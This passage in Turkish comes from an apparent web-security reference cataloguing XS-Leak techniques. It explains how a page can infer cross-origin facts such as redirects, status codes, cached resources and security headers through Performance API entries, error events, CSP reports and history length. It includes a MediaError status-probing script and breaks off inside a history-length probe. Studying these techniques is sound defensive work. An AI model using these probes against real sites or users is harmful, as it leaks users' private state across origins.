- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Bir tarayıcı hatası nedeniyle, hatalara neden olan istekler iki kez yüklenir.
- **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Önceki teknikte, GC'deki tarayıcı hatalarının, **yüklenemeyen kaynakların iki kez yüklenmesine** neden olduğu iki durum da tespit edilmiştir. Bu, Performans API'sinde birden fazla girişe yol açar ve bu nedenle tespit edilebilir.

### Request Merging Error

- **Inclusion Methods**: HTML Elements
- **Detectable Difference**: Durum Kodu
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Hatalara neden olan istekler birleştirilemez.
- **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Bu teknik, bahsedilen belgede bir tabloda bulunmuştur ancak tekniğin tanımı bulunmamıştır. Ancak, [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak) adresinde kontrol ederek kaynak kodunu bulabilirsiniz.

### Empty Page Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Boş yanıtlar kaynak zamanlama girişleri oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Bir saldırgan, bir isteğin boş bir HTTP yanıt gövdesi ile sonuçlanıp sonuçlanmadığını tespit edebilir çünkü **boş sayfalar bazı tarayıcılarda performans girişi oluşturmaz**.

### **XSS-Auditor Leak**

- **Inclusion Methods**: Frames
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Güvenlik İddialarında XSS Auditor kullanarak, saldırganlar, oluşturulan yüklerin denetleyicinin filtreleme mekanizmasını tetiklemesi durumunda yanıtların değişimini gözlemleyerek belirli web sayfası öğelerini tespit edebilir.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Güvenlik İddialarında (SA), Cross-Site Scripting (XSS) saldırılarını önlemek için tasarlanmış olan XSS Auditor, paradoksal olarak hassas bilgileri sızdırmak için istismar edilebilir. Bu yerleşik özellik, Google Chrome'dan (GC) kaldırılmış olsa da, SA'da hala mevcuttur. 2013 yılında Braun ve Heiderich, XSS Auditor'un yanlış pozitiflere yol açarak meşru betikleri yanlışlıkla engelleyebileceğini göstermiştir. Bunun üzerine, araştırmacılar, bilgileri çıkarmak ve çapraz kaynaklı sayfalardaki belirli içerikleri tespit etmek için teknikler geliştirmiştir; bu kavram XS-Sızıntıları olarak bilinir ve ilk olarak Terada tarafından rapor edilmiş, Heyes tarafından bir blog yazısında detaylandırılmıştır. Bu teknikler, GC'deki XSS Auditor'a özgü olsa da, SA'da XSS Auditor tarafından engellenen sayfaların Performans API'sinde giriş oluşturmadığı keşfedilmiştir, bu da hassas bilgilerin hala sızdırılabileceği bir yöntem sunar.

### X-Frame Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlık
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
- **Summary:** X-Frame-Options başlığına sahip kaynak, kaynak zamanlama girişi oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Eğer bir sayfanın **iframe** içinde **render edilmesine izin verilmiyorsa**, bu **performans girişi** oluşturmaz. Sonuç olarak, bir saldırgan **`X-Frame-Options`** yanıt başlığını tespit edebilir.\
Aynı şey bir **embed** **etiketi** kullanıldığında da geçerlidir.

### Download Detection

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlık
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** İndirmeler, Performans API'sinde kaynak zamanlama girişleri oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Aynı şekilde, içerik başlığı nedeniyle **indirilmiş bir kaynak**, **performans girişi** oluşturmaz. Bu teknik, tüm büyük tarayıcılarda çalışır.

### Redirect Start Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Yönlendirme
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Kaynak zamanlama girişi, bir yönlendirmenin başlangıç zamanını sızdırır.
- **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Bazı tarayıcıların çapraz kaynak istekleri için çok fazla bilgi kaydetme davranışını kötüye kullanan bir XS-Sızıntı örneği bulduk. Standart, çapraz kaynaklı kaynaklar için sıfıra ayarlanması gereken bir dizi özelliği tanımlar. Ancak, **SA**'da, kullanıcıyı hedef sayfa tarafından **yönlendirildiğini** tespit etmek mümkündür; Performans API'sini sorgulayarak ve **redirectStart zamanlama verisini** kontrol ederek.

### Duration Redirect Leak

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Yönlendirme
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** Yönlendirme gerçekleştiğinde zamanlama girişlerinin süresi negatiftir.
- **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

GC'de, **yönlendirme** ile sonuçlanan istekler için **süre** **negatif** olup, bu nedenle yönlendirme ile sonuçlanmayan isteklerden **ayrılabilir**.

### CORP Leak

- **Inclusion Methods**: Frames
- **Detectable Difference**: Başlık
- **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
- **Summary:** CORP ile korunan kaynaklar, kaynak zamanlama girişleri oluşturmaz.
- **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Bazı durumlarda, **nextHopProtocol girişi** bir sızıntı tekniği olarak kullanılabilir. GC'de, **CORP başlığı** ayarlandığında, nextHopProtocol **boş** olacaktır. SA'nın, CORP etkin kaynaklar için hiç performans girişi oluşturmayacağını unutmayın.

### Service Worker

- **Inclusion Methods**: Frames
- **Detectable Difference**: API Kullanımı
- **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
- **Summary:** Belirli bir köken için bir hizmet çalışanının kaydedilip kaydedilmediğini tespit edin.
- **Code Example**:

Hizmet çalışanları, bir kökende çalışan olay odaklı betik bağlamlarıdır. Bir web sayfasının arka planında çalışır ve kaynakları **yakalamak**, **değiştirmek** ve **önbelleğe almak** için kullanılabilir, böylece çevrimdışı web uygulamaları oluşturulabilir.\
Eğer bir **hizmet çalışanı** tarafından **önbelleğe alınmış** bir **kaynağa** **iframe** aracılığıyla erişilirse, kaynak **hizmet çalışanı önbelleğinden** **yüklenir**.\
Kaynağın **hizmet çalışanı** önbelleğinden **yüklenip yüklenmediğini** tespit etmek için **Performans API'si** kullanılabilir.\
Bu, bir Zamanlama saldırısı ile de yapılabilir (daha fazla bilgi için belgeyi kontrol edin).

### Cache

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Zamanlama
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
- **Summary:** Bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](<https://xsinator.com/testing.html#Cache%20Leak%20(POST)>)

[Performance API](xs-search.md#performance-api) kullanarak bir kaynağın önbelleğe alınıp alınmadığını kontrol etmek mümkündür.

### Network Duration

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Sayfa İçeriği
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
- **Summary:** `performance` API'sinden bir isteğin ağ süresini almak mümkündür.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

- **Inclusion Methods**: HTML Elements (Video, Audio)
- **Detectable Difference**: Durum Kodu
- **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
- **Summary:** Firefox'ta, çapraz kaynak isteğinin durum kodunu doğru bir şekilde sızdırmak mümkündür.
- **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false)
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg
}

function startup() {
let audioElement = document.getElementById("audio")
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener(
"click",
function () {
audioElement.src = document.getElementById("testUrl").value
},
false
)
// Create the event handler
var errHandler = function () {
let err = this.error
let message = err.message
let status = ""

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if (
message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1 ||
message.indexOf("Failed to init decoder") != -1
) {
status = "Success"
} else {
status = "Error"
}
displayErrorMessage(
"<strong>Status: " +
status +
"</strong> (Error code:" +
err.code +
" / Error Message: " +
err.message +
")<br>"
)
}
audioElement.onerror = errHandler
}
```
`MediaError` arayüzünün message özelliği, başarılı bir şekilde yüklenen kaynakları benzersiz bir dize ile tanımlar. Bir saldırgan, bu özelliği mesaj içeriğini gözlemleyerek, bir cross-origin kaynağının yanıt durumunu çıkararak istismar edebilir.

### CORS Hatası

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları, yönlendirilmiş isteklerin tam URL'sini istemeden açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Bu teknik, bir saldırganın **cross-origin bir sitenin yönlendirmesinin hedefini çıkarmasını** sağlar; çünkü Webkit tabanlı tarayıcıların CORS isteklerini nasıl işlediğini istismar eder. Özellikle, bir **CORS etkin isteği** kullanıcı durumuna dayalı olarak yönlendirme yapan bir hedef siteye gönderildiğinde ve tarayıcı isteği reddettiğinde, **yönlendirme hedefinin tam URL'si** hata mesajında ifşa edilir. Bu güvenlik açığı, yönlendirme gerçeğini açığa çıkarmakla kalmaz, aynı zamanda yönlendirmenin uç noktasını ve içerebileceği herhangi bir **hassas sorgu parametresini** de açığa çıkarır.

### SRI Hatası

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
- **Özet:** Güvenlik İddialarında (SA), CORS hata mesajları, yönlendirilmiş isteklerin tam URL'sini istemeden açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Bir saldırgan, **açık hata mesajlarını** kullanarak cross-origin yanıtlarının boyutunu çıkarabilir. Bu, genellikle CDN'lerden alınan kaynakların değiştirilmediğini doğrulamak için bütünlük niteliğini kullanan Alt Kaynak Bütünlüğü (SRI) mekanizmasından kaynaklanmaktadır. SRI'nin cross-origin kaynaklarda çalışabilmesi için, bunların **CORS etkin** olması gerekir; aksi takdirde bütünlük kontrollerine tabi tutulmazlar. Güvenlik İddialarında (SA), CORS hata XS-Leak gibi, bir bütünlük niteliği ile başarısız olan bir fetch isteğinden sonra bir hata mesajı yakalanabilir. Saldırganlar, herhangi bir isteğin bütünlük niteliğine **sahtelik hash değeri** atayarak bu hatayı kasıtlı olarak **tetikleyebilirler**. SA'da, ortaya çıkan hata mesajı, istenen kaynağın içerik uzunluğunu istemeden açığa çıkarır. Bu bilgi sızıntısı, bir saldırganın yanıt boyutundaki değişiklikleri ayırt etmesine olanak tanır ve karmaşık XS-Leak saldırılarına zemin hazırlar.

### CSP İhlali/Tespiti

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
- **Özet:** Eğer yalnızca kurbanın web sitesi CSP'de izin verilirse ve farklı bir alan adına yönlendirmeye çalışırsa, CSP tespit edilebilir bir hata tetikler.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

Bir XS-Leak, CSP'yi kullanarak bir cross-origin sitenin farklı bir kökene yönlendirilip yönlendirilmediğini tespit edebilir. Bu sızıntı, yönlendirmeyi tespit edebilir, ayrıca yönlendirme hedefinin alan adını da açığa çıkarır. Bu saldırının temel fikri, **saldırgan sitesinde hedef alan adını izin vermektir**. Hedef alana bir istek gönderildiğinde, **cross-origin bir alana yönlendirir**. **CSP,** buna erişimi engeller ve bir **ihlal raporu oluşturur**; bu rapor bir sızıntı tekniği olarak kullanılır. Tarayıcıya bağlı olarak, **bu rapor yönlendirmenin hedef konumunu açığa çıkarabilir**.\
Modern tarayıcılar, yönlendirildiği URL'yi belirtmeyecek, ancak bir cross-origin yönlendirmesinin tetiklendiğini yine de tespit edebilirsiniz.

### Önbellek

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Sayfa İçeriği
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
- **Özet:** Dosyayı önbellekten temizle. Hedef sayfayı açar, dosyanın önbellekte olup olmadığını kontrol eder.
- **Kod Örneği:**

Tarayıcılar, tüm web siteleri için tek bir paylaşılan önbellek kullanabilir. Kökenlerinden bağımsız olarak, bir hedef sayfanın **belirli bir dosyayı talep edip etmediğini** çıkarmak mümkündür.

Eğer bir sayfa yalnızca kullanıcı giriş yaptığında bir resmi yüklüyorsa, **kaynağı geçersiz kılabilir** (yani, önbellekte değilse, daha fazla bilgi bağlantılarına bakın), **o kaynağı yükleyebilecek bir istek gerçekleştirebilir** ve kaynağı **kötü bir istekle yüklemeyi deneyebilir** (örneğin, aşırı uzun bir referans başlığı kullanarak). Eğer kaynak yüklemesi **herhangi bir hata tetiklemediyse**, bunun nedeni **önbelleğe alınmış** olmasıdır.

### CSP Yönergesi

- **Dahil Etme Yöntemleri**: Çerçeveler
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
- **Özet:** CSP başlık yönergeleri, CSP iframe niteliği kullanılarak sorgulanabilir ve politika detaylarını açığa çıkarır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

Google Chrome'daki (GC) yeni bir özellik, web sayfalarının bir iframe öğesine bir nitelik ayarlayarak **Bir İçerik Güvenlik Politikası (CSP) önermesine** olanak tanır; politika yönergeleri HTTP isteği ile birlikte iletilir. Normalde, gömülü içeriğin **bunu bir HTTP başlığı aracılığıyla yetkilendirmesi** gerekir, aksi takdirde bir **hata sayfası görüntülenir**. Ancak, eğer iframe zaten bir CSP tarafından yönetiliyorsa ve yeni önerilen politika daha kısıtlayıcı değilse, sayfa normal şekilde yüklenir. Bu mekanizma, bir saldırganın bir cross-origin sayfanın **belirli CSP yönergelerini** tespit etmesine olanak tanır; hata sayfasını tanımlayarak. Bu güvenlik açığı kapatılmış olarak işaretlenmiş olsa da, bulgularımız, hata sayfasını tespit edebilen **yeni bir sızıntı tekniği** ortaya koymaktadır; bu da temel sorunun asla tam olarak ele alınmadığını göstermektedir.

### **CORP**

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
- **Özet:** Cross-Origin Resource Policy (CORP) ile güvence altına alınmış kaynaklar, yasaklı bir kökenden alındığında hata verir.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP başlığı, belirli bir kaynağa yönelik no-cors cross-origin isteklerini **engelleyen** nispeten yeni bir web platformu güvenlik özelliğidir. CORP ile korunan bir kaynak, **alındığında hata verecektir**; bu başlığın varlığı tespit edilebilir.

### CORB

- **Dahil Etme Yöntemleri**: HTML Elemanları
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
- **Özet:** CORB, saldırganların **`nosniff` başlığının istekte mevcut olup olmadığını** tespit etmelerine olanak tanır.
- **Kod Örneği**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Saldırı hakkında daha fazla bilgi için bağlantıyı kontrol edin.

### CORS hatası üzerinde Köken Yansıması yanlış yapılandırması <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
- **Özet:** Eğer Origin başlığı `Access-Control-Allow-Origin` başlığında yansıtılıyorsa, bir kaynağın önbellekte olup olmadığını kontrol etmek mümkündür.
- **Kod Örneği**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Eğer **Origin başlığı**, `Access-Control-Allow-Origin` başlığında **yansıtılıyorsa**, bir saldırgan bu davranışı istismar ederek **CORS** modunda **kaynağı** **almaya** çalışabilir. Eğer bir **hata** **tetiklenmezse**, bu, kaynağın **web'den doğru bir şekilde alındığı** anlamına gelir; eğer bir hata **tetiklenirse**, bunun nedeni **önbellekten erişilmiş olmasıdır** (hata, önbelleğin orijinal alan adına izin veren bir CORS başlığı ile bir yanıt kaydetmesi nedeniyle görünür).\
Eğer köken yansıtılmıyorsa ancak bir joker karakter kullanılıyorsa (`Access-Control-Allow-Origin: *`), bu çalışmayacaktır.

## Okunabilir Nitelikler Tekniği

### Fetch Yönlendirmesi

- **Dahil Etme Yöntemleri**: Fetch API
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
- **Özet:** GC ve SA, yönlendirme tamamlandıktan sonra yanıtın türünü (opaque-redirect) kontrol etmeye olanak tanır.
- **Kod Örneği**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` ve diğer parametrelerle Fetch API kullanarak bir istek gönderildiğinde, `response.type` niteliğini okumak mümkündür ve eğer `opaqueredirect` ile eşitse, yanıt bir yönlendirme olmuştur.

### COOP

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Header
- **Daha fazla bilgi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
- **Özet:** Cross-Origin Opener Policy (COOP) ile korunan sayfalar, cross-origin etkileşimlerden erişimi engeller.
- **Kod Örneği**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Bir saldırgan, cross-origin bir HTTP yanıtında Cross-Origin Opener Policy (COOP) başlığının varlığını çıkarabilir. COOP, web uygulamaları tarafından dış sitelerin rastgele pencere referansları elde etmesini engellemek için kullanılır. Bu başlığın görünürlüğü, **`contentWindow` referansına erişmeye çalışarak** tespit edilebilir. COOP koşullu olarak uygulandığında, **`opener` niteliği** belirleyici bir gösterge haline gelir: COOP aktif olduğunda **tanımsızdır**, yokluğunda ise **tanımlıdır**.

### URL Maksimum Uzunluğu - Sunucu Tarafı

- **Dahil Etme Yöntemleri**: Fetch API, HTML Elemanları
- **Tespit Edilebilir Fark**: Durum Kodu / İçerik
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
- **Özet:** Yönlendirme yanıt uzunluğundaki farklılıkları tespit et, çünkü sunucu bir hata ile yanıt verebilir ve bir uyarı oluşturulabilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Eğer sunucu tarafı yönlendirmesi **yönlendirme içinde kullanıcı girdisi** ve **ek veri** kullanıyorsa, bu davranışı tespit etmek mümkündür; çünkü genellikle **sunucuların** **istek uzunluğu sınırı** vardır. Eğer **kullanıcı verisi** o **uzunluk - 1** ise, çünkü **yönlendirme** **o veriyi** kullanıyor ve **ek bir şey** ekliyorsa, bu bir **hata tetikler** ve **Hata Olayları** aracılığıyla tespit edilebilir.

Eğer bir şekilde bir kullanıcıya çerez ayarlayabiliyorsanız, bu saldırıyı **yeterli çerez ayarlayarak** ([**çerez bombası**](hacking-with-cookies/cookie-bomb.md)) da gerçekleştirebilirsiniz; böylece **doğru yanıtın** **artmış boyutu** bir **hata** tetikler. Bu durumda, bu isteği aynı siteden tetiklediğinizde, `<script>` otomatik olarak çerezleri gönderecektir (bu nedenle hataları kontrol edebilirsiniz).\
**Çerez bombası + XS-Arama** örneği, bu yazının Amaçlanan çözümünde bulunabilir: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` veya aynı bağlamda olmak genellikle bu tür bir saldırı için gereklidir.

### URL Maksimum Uzunluğu - İstemci Tarafı

- **Dahil Etme Yöntemleri**: Pop-up'lar
- **Tespit Edilebilir Fark**: Durum Kodu / İçerik
- **Daha fazla bilgi**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
- **Özet:** Yönlendirme yanıt uzunluğundaki farklılıkları tespit et, çünkü bir isteğin yönlendirme yanıtı çok büyük olabilir ve bir fark fark edilebilir.
- **Kod Örneği**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium belgelerine](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length) göre, Chrome'un maksimum URL uzunluğu 2MB'dır.

> Genel olarak, _web platformu_ URL'lerin uzunluğu üzerinde sınırlara sahip değildir (ancak 2^31 yaygın bir sınırdır). _Chrome_, pratik nedenlerle ve süreçler arası iletişimde hizmet reddi sorunlarını önlemek için URL'leri maksimum **2MB** uzunluğuyla sınırlar.

Bu nedenle, eğer **yönlendirme URL'si bir durumda daha büyükse**, **2MB'dan daha büyük bir URL ile yönlendirme yapması** mümkündür. Bu durumda, Chrome **`about:blank#blocked`** sayfasını gösterir.

**Fark edilebilir fark**, eğer **yönlendirme** **tamamlandıysa**, `window.origin` bir **hata** fırlatır; çünkü bir cross-origin bu bilgiyi erişemez. Ancak, eğer **sınır** **aşıldıysa** ve yüklenen sayfa **`about:blank#blocked`** ise, pencerenin **`origin`** değeri **ebeveynin** değeri olarak kalır; bu da **erişilebilir bir bilgidir.**

**2MB**'ya ulaşmak için gereken tüm ek bilgiler, başlangıç URL'sinde bir **hash** aracılığıyla eklenebilir, böylece **yönlendirmede kullanılabilir**.

{{#ref}}
xs-search/url-max-length-client-side.md
{{#endref}}

### Maksimum Yönlendirmeler

- **Dahil Etme Yöntemleri**: Fetch API, Çerçeveler
- **Tespit Edilebilir Fark**: Durum Kodu
- **Daha fazla bilgi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
- **Özet:** Tarayıcının yönlendirme sınırını kullanarak URL yönlendirmelerinin gerçekleşip gerçekleşmediğini belirleyin.
- **Kod Örneği**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Eğer bir tarayıcının **takip edeceği maksimum** **yönlendirme** sayısı **20** ise, bir saldırgan **19 yönlendirme** ile kendi sayfasını yüklemeyi deneyebilir ve sonunda **kurbanı** test edilen sayfaya gönderebilir. Eğer bir **hata** tetiklenirse, bu durumda sayfa **kurbanı yönlendirmeye** çalışıyordur.

### Geçmiş Uzunluğu

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Yönlendirmeler
- **Daha fazla bilgi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
- **Özet:** JavaScript kodu tarayıcı geçmişini manipüle eder ve uzunluk özelliği ile erişilebilir.
- **Kod Örneği**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**Geçmiş API'si**, JavaScript kodunun tarayıcı geçmişini manipüle etmesine olanak tanır; bu, **bir kullanıcının ziyaret ettiği sayfaları kaydeder**. Bir saldırgan, uzunluk özelliğini bir dahil etme yöntemi olarak kullanabilir: JavaScript ve HTML navigasyonunu tespit etmek için.\
**`history.length`** kontrol ederek, bir kullanıcıyı **bir sayfaya yönlendirebilir**, **geri** dönebilir ve **`history.length`**'in yeni değerini kontrol edebilir.

### Aynı URL ile Geçmiş Uzunluğu

- **Dahil Etme Yöntemleri**: Çerçeveler, Pop-up'lar
- **Tespit Edilebilir Fark**: Eğer URL tahmin edilenle aynıysa
- **Özet:** Geçmiş uzunluğunu istismar ederek bir çerçeve/pop-up'ın belirli bir URL'de olup olmadığını tahmin etmek mümkündür.
- **Kod Örneği**: Aşağıda

Bir saldırgan, JavaScript kodunu kullanarak **çerçeve/pop-up konumunu tahmin edilen bir URL'ye** **manipüle edebilir** ve **hemen ardından** **`about:blank`**'e **değiştirebilir**. Eğer geçmiş uzunluğu arttıysa, bu, URL'nin doğru olduğu ve **artış için zaman bulduğu** anlamına gelir; çünkü URL aynıysa yeniden yüklenmez. Eğer artmadıysa, bu, **tahmin edilen URL'yi yüklemeye çalıştığı** ancak **hemen ardından** **`about:blank`**'i yüklediği anlamına gelir; bu durumda **geçmiş uzunluğu, tahmin edilen URL'yi yüklerken asla artmamıştır.**
```javascript
async function debug(win, url) {
win.location = url + "#aaa"
win.location = "about:blank"
